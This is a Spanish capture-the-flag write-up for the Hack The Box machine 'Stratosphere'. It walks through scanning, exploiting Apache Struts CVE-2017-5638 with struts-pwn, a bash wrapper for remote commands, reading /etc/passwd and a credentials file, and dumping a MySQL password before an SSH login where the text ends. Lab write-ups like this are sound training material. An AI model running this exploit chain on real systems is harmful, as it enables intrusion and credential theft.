---
title: Hack The Box Stratosphere
author: k4myo
date: 2021-10-12
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Medium, Linux]
tags: [File Misconfiguration]
ping: true
---

## Stratosphere
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.64.

```bash
❯ ping -c 1 10.10.10.64
PING 10.10.10.64 (10.10.10.64) 56(84) bytes of data.
64 bytes from 10.10.10.64: icmp_seq=1 ttl=63 time=184 ms

--- 10.10.10.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 184.278/184.278/184.278/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.64 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-12 15:02 CDT
Initiating SYN Stealth Scan at 15:02
Scanning 10.10.10.64 [65535 ports]
Discovered open port 80/tcp on 10.10.10.64
Discovered open port 22/tcp on 10.10.10.64
Discovered open port 8080/tcp on 10.10.10.64
Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 62.64% done; ETC: 15:02 (0:00:14 remaining)
Completed SYN Stealth Scan at 15:03, 39.59s elapsed (65535 total ports)
Nmap scan report for 10.10.10.64
Host is up, received user-set (0.14s latency).
Scanned at 2021-10-12 15:02:21 CDT for 39s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.69 seconds
           Raw packets sent: 196627 (8.652MB) | Rcvd: 31 (1.364KB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.64
   5   │     [*] Open ports: 22,80,8080
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p22,80,8080 10.10.10.64 -oN targeted                                                                             
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-12 15:05 CDT                                                                  
Nmap scan report for 10.10.10.64                                                                                                 
Host is up (0.14s latency).                                                                                                      
                                                                                                                                 
PORT     STATE SERVICE    VERSION                                                                                                
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)                                                          
| ssh-hostkey:                                                                                                                   
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)                                                                   
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)                                                                  
|_  256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)                                                                
80/tcp   open  http                                                                                                              
|_http-title: Stratosphere                                                                                                       
| fingerprint-strings:                                                                                                           
|   FourOhFourRequest:                                                                                                           
|     HTTP/1.1 404                                                                                                               
|     Content-Type: text/html;charset=utf-8                                                                                      
|     Content-Language: en                                                                                                       
|     Content-Length: 1114                                                                                                       
|     Date: Tue, 12 Oct 2021 20:10:28 GMT                                                                                        
|     Connection: close                                                                                                          
|     <!doctype html><html lang="en"><head><title>HTTP Status 404                                                                
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:
22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial
,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;backgroun
d-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-se
rif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D
76;border:none;}</style></head><body>
|   GetRequest:                                                                                                                  
|     HTTP/1.1 200                                                                                                               
|     Accept-Ranges: bytes                                                                                                       
|     ETag: W/"1708-1519762495000"                                                                                               
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT                                                                               
|     Content-Type: text/html                                                                                                    
|     Content-Length: 1708                                                                                                       
|     Date: Tue, 12 Oct 2021 20:10:27 GMT                                                                                        
|     Connection: close                                                                                                          
|     <!DOCTYPE html>                                                                                                            
|     <html>                                                                                                                     
|     <head>                                                                                                                     
|     <meta charset="utf-8"/>                                                                                                    
|     <title>Stratosphere</title>                                                                                                
|     <link rel="stylesheet" type="text/css" href="main.css">                                                                    
|     </head>                                                                                                                    
|     <body>                                                                                                                     
|     <div id="background"></div>                                                                                                
|     <header id="main-header" class="hidden">                                                                                   
|     <div class="container">                                                                                                    
|     <div class="content-wrap">                                                                                                 
|     <p><i class="fa fa-diamond"></i></p>                                                                                       
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap"> 
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a> 
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Tue, 12 Oct 2021 20:10:27 GMT
|     Connection: close
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 
|     Date: Tue, 12 Oct 2021 20:10:27 GMT
|_    Connection: close
| http-methods: 
|_  Potentially risky methods: PUT DELETE
8080/tcp open  http-proxy
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
|_http-open-proxy: Proxy might be redirecting requests
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Tue, 12 Oct 2021 20:10:27 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:
22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial
,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;backgroun
d-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-se
rif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D
76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Tue, 12 Oct 2021 20:10:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap"> 
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap"> 
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a> 
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Tue, 12 Oct 2021 20:10:27 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Date: Tue, 12 Oct 2021 20:10:27 GMT
|_    Connection: close
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http
s://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=10/12%Time=6165EA91%P=x86_64-pc-linux-gnu%r(Get
SF:Request,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\x
SF:20W/\"1708-1519762495000\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x2020
SF:18\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\
SF:x201708\r\nDate:\x20Tue,\x2012\x20Oct\x202021\x2020:10:27\x20GMT\r\nCon
SF:nection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x
SF:20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosphere
SF:</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/cs
SF:s\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"background\
SF:"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x20<
SF:div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-wr
SF:ap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></i>
SF:</p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20<a
SF:\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>\n
SF:\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div>\
SF:n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"con
SF:tainer\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\x2
SF:0\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h1>
SF:\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarted\
SF:.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20cla
SF:ss=\"ar")%r(HTTPOptions,8A,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x20H
SF:EAD,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS\r\nContent-Length:\x200\r\n
SF:Date:\x20Tue,\x2012\x20Oct\x202021\x2020:10:27\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n")%r(RTSPRequest,49,"HTTP/1\.1\x20400\x20\r\nDate:\x20Tue
SF:,\x2012\x20Oct\x202021\x2020:10:27\x20GMT\r\nConnection:\x20close\r\n\r
SF:\n")%r(X11Probe,49,"HTTP/1\.1\x20400\x20\r\nDate:\x20Tue,\x2012\x20Oct\
SF:x202021\x2020:10:27\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(FourOhFo
SF:urRequest,4F6,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20text/html;chars
SF:et=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201114\r\nDate:
SF:\x20Tue,\x2012\x20Oct\x202021\x2020:10:28\x20GMT\r\nConnection:\x20clos
SF:e\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20St
SF:atus\x20404\x20\xe2\x80\x93\x20Not\x20Found</title><style\x20type=\"tex
SF:t/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;backgrou
SF:nd-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sa
SF:ns-serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x2
SF:0{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525
SF:D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;co
SF:lor:black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sa
SF:ns-serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Ta
SF:homa,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20
SF:a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1
SF:px;background-color:#525D76;border:none;}</style></head><body>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.92%I=7%D=10/12%Time=6165EA91%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:
SF:\x20W/\"1708-1519762495000\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x20
SF:2018\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length
SF::\x201708\r\nDate:\x20Tue,\x2012\x20Oct\x202021\x2020:10:27\x20GMT\r\nC
SF:onnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20
SF:\x20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosphe
SF:re</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/
SF:css\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"backgroun
SF:d\"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x2
SF:0<div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-
SF:wrap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></
SF:i></p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<a\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>
SF:\n\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div
SF:>\n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"c
SF:ontainer\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\
SF:x20\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h
SF:1>\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarte
SF:d\.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20c
SF:lass=\"ar")%r(HTTPOptions,8A,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x2
SF:0HEAD,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS\r\nContent-Length:\x200\r
SF:\nDate:\x20Tue,\x2012\x20Oct\x202021\x2020:10:27\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RTSPRequest,49,"HTTP/1\.1\x20400\x20\r\nDate:\x20T
SF:ue,\x2012\x20Oct\x202021\x2020:10:27\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n")%r(FourOhFourRequest,4F6,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x
SF:20text/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:
SF:\x201114\r\nDate:\x20Tue,\x2012\x20Oct\x202021\x2020:10:27\x20GMT\r\nCo
SF:nnection:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head>
SF:<title>HTTP\x20Status\x20404\x20\xe2\x80\x93\x20Not\x20Found</title><st
SF:yle\x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;col
SF:or:white;background-color:#525D76;font-size:22px;}\x20h2\x20{font-famil
SF:y:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-siz
SF:e:16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white;back
SF:ground-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Ar
SF:ial,sans-serif;color:black;background-color:white;}\x20b\x20{font-famil
SF:y:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\x20p\x
SF:20{font-family:Tahoma,Arial,sans-serif;background:white;color:black;fon
SF:t-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.
SF:line\x20{height:1px;background-color:#525D76;border:none;}</style></hea
SF:d><body>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.45 seconds
```

Vemos los puertos 80 y 8080 asociados al servicio HTTP, por lo que vamos a ver a lo que nos enfrentamos con `whatweb`:

```bash
❯ whatweb http://10.10.10.64/
http://10.10.10.64/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
❯ whatweb http://10.10.10.64:8080/
http://10.10.10.64:8080/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.64], Script, Title[Stratosphere]
```

No vemos nada interesante, así que vamos a ver el contenido web:

![](/assets/images/htb-stratosphere/stratosphere-web.png)

Que tampoco vemos algo que nos de valor como atacantes, así que vamos a tratar de descubrir rutas dentro del servidor web:

```bash
❯ wfuzz -c -t 100 --hc=404 --hw=153 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.64/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.64/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000004889:   302        0 L      0 W        0 Ch        "manager"                                                       
000013290:   302        0 L      0 W        0 Ch        "Monitoring"                                                    
000022971:   400        0 L      0 W        0 Ch        "http%3A%2F%2Fwww"                                              
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 127.3097
Processed Requests: 39673
Filtered Requests: 39670
Requests/sec.: 311.6257
```

```bash
❯ wfuzz -c -t 100 --hc=404 --hw=153 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.64:8080/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.64:8080/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000004889:   302        0 L      0 W        0 Ch        "manager"                                                       
000013290:   302        0 L      0 W        0 Ch        "Monitoring"                                                    
000022971:   400        0 L      0 W        0 Ch        "http%3A%2F%2Fwww"                                         
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 127.3097
Processed Requests: 39673
Filtered Requests: 39670
Requests/sec.: 311.6257
```

Vemos los recursos `manager` y `Monitoring`, al tratar de checarlos, el recurso `manager` nos arroja un panel de login asociado a **Apache Tomcat** y las credenciales por defecto no funcionan. Para el recurso `Monitoring` vemos un panel de login y notamos algo extraño en la dirección URL:

![](/assets/images/htb-stratosphere/stratosphere-monitoring.png)

Tenemos un archivo llamado `Welcome.action` con una extensión poco común; así que buscaremos un posible exploit relacionado con ese tipo de extensión.

[struts-pwn](https://github.com/mazen160/struts-pwn)

Tenemos el recurso ***struts-pwn*** que es un exploit asociado a Apache Struts cuya vulnerabilidad se encuentra descrita en el CVE *CVE-2017-5638* y que nos permite la ejecución de comandos a nivel de sistema; así que vamos a descargarlo a nuestro directorio de trabajo.

```bash
❯ git clone https://github.com/mazen160/struts-pwn
Clonando en 'struts-pwn'...
remote: Enumerating objects: 37, done.
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37
Recibiendo objetos: 100% (37/37), 8.92 KiB | 8.92 MiB/s, listo.
Resolviendo deltas: 100% (21/21), listo.
```

Y de acuerdo con el repositorio, debemos instalar primeramente los requerimientos que necesita el programa para funcionar y hay que tener en cuenta que está desarrollado en python3.

```bash
❯ pip3 install -r requirements.txt
WARNING: The directory '/root/.cache/pip' or its parent directory is not owned or is not writable by the current user. The cache has been disabled. Check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Collecting argparse
  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from -r requirements.txt (line 2)) (2.25.1)
Installing collected packages: argparse
Successfully installed argparse-1.4.0
❯ 
❯ python3 struts-pwn.py -h
usage: struts-pwn.py [-h] [-u URL] [-l USEDLIST] [-c CMD] [--check]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Check a single URL.
  -l USEDLIST, --list USEDLIST
                        Check a list of URLs.
  -c CMD, --cmd CMD     Command to execute. (Default: id)
  --check               Check if a target is vulnerable.

```

Dentro del panel de ayuda de la herrmienta, se cuenta con un checker, así que vamos a validar si la máquina víctima es vulnerable:

```bash
❯ python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Welcome.action --check

[*] URL: http://10.10.10.64:8080/Monitoring/example/Welcome.action
[*] Status: Vulnerable!
[%] Done.
❯ python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action --check

[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
[*] Status: Vulnerable!
[%] Done.
```

Otra forma de validar si el sitio es vulnerable es mediante el uso de `nmap`, buscando si existe el CVE y agregando la ruta:

```bash
❯ locate cve2017-5638.nse
/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse
❯ nmap --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ -p8080 10.10.10.64
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-12 16:07 CDT
Nmap scan report for 10.10.10.64
Host is up (0.14s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-vuln-cve2017-5638: 
|   VULNERABLE:
|   Apache Struts Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-5638
|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
|       vulnerability via the Content-Type header.
|           
|     Disclosure date: 2017-03-07
|     References:
|       https://cwiki.apache.org/confluence/display/WW/S2-045
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
|_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html

Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
❯ nmap --script http-vuln-cve2017-5638 --script-args path=/Monitoring/ -p80 10.10.10.64
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-12 16:07 CDT
Nmap scan report for 10.10.10.64
Host is up (0.14s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-vuln-cve2017-5638: 
|   VULNERABLE:
|   Apache Struts Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-5638
|       Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution
|       vulnerability via the Content-Type header.
|           
|     Disclosure date: 2017-03-07
|     References:
|       https://cwiki.apache.org/confluence/display/WW/S2-045
|       http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638

Nmap done: 1 IP address (1 host up) scanned in 1.27 seconds
```

Vamos a validar si podemos ejecutar comandos a nivel de sistema y para evitar hacer para el puerto 80 y luego para el puerto 8080, vamos a tomar únicamente el puerto 8080:

```bash
❯ python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c "whoami"

[*] URL: http://10.10.10.64/Monitoring/example/Welcome.action
[*] CMD: whoami
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

tomcat8

[%] Done.
```

Nos encontramos como el usuario `tomcat8`. Si tratamos de entablarnos una reverse shell, vemos que NO nos va a dejar; asi que vamos vamos a buscar recursos y otra forma de obtener acceso a la máquina. Asi que nos vamos a crear un script en bash para tener mejor movilidad a la hora de ejecutar comandos:

```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n[!] Saliendo..."
        exit 1
}

trap ctrl_c INT

while [ "$command" != "exit" ];do
        echo -n "$~ " && read command
        python3 struts-pwn.py -u http://10.10.10.64:8080/Monitoring/example/Welcome.action -c """$command""" | grep "Prematurely" -A 100 | grep -v -E "Note:|Done"
done
```

Vamos a checar los archivos que se encuentra en el directorio:

```bash
❯ rlwrap ./shell_struts.sh
$~ whoami

tomcat8

$~ ls -l

total 16
lrwxrwxrwx 1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r-- 1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x 2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx 1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x 2 root    root    4096 Oct 12 16:04 policy
drwxrwxr-x 4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx 1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8

$~ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
rtkit:x:105:109:RealtimeKit,,,:/proc:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:107:110::/var/run/dbus:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
speech-dispatcher:x:109:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
lightdm:x:111:113:Light Display Manager:/var/lib/lightdm:/bin/false
pulse:x:112:114:PulseAudio daemon,,,:/var/run/pulse:/bin/false
avahi:x:113:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
saned:x:114:118::/var/lib/saned:/bin/false
richard:x:1000:1000:Richard F Smith,,,:/home/richard:/bin/bash
tomcat8:x:115:119::/var/lib/tomcat8:/bin/bash
mysql:x:116:120:MySQL Server,,,:/nonexistent:/bin/false

$~ 
```

Dentro del directorio donde nos encontramos, vemos el archivo `db_connect` el cual posiblemente contenga credenciales:

```bash
$~ cat db_connect

[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin

$~ 
```

Podriamos tratar de ver el contenido de la base de datos con el parámetro `-e`:

```bash
$~ mysql -uadmin -padmin -e "show databases"

Database
information_schema
users

$~ 
```

Vemos la base de datos `users`, vamos a tratar de listar las tablas que contiene:

```bash
$~ mysql -uadmin -padmin -e "use users; show tables"

Tables_in_users
accounts

$~ mysql -uadmin -padmin -e "use users; describe accounts"

Field   Type    Null    Key     Default Extra
fullName        varchar(45)     YES             NULL
password        varchar(30)     YES             NULL
username        varchar(20)     YES             NULL

$~ mysql -uadmin -padmin -e "use users; select username,password from accounts"

username        password
richard 9tc*rhKuG5TyXvUJOrE^5CK7k

$~ 
```

Tenemos credenciales del usuario `richard` que checando el archivo `/etc/passwd` es un usuario válido al nivel de sistema; por lo que podríamos tratar de acceder por SSH:

```bash
❯ ssh richard@10.10.10.64
The authenticity of host '10.10.10.64 (10.10.10.64)' can't be established.
ECDSA key fingerprint is SHA256:tQZo8j1TeVASPxWyDgqJf8PaDZJV/+LeeBZnjueAW/E.
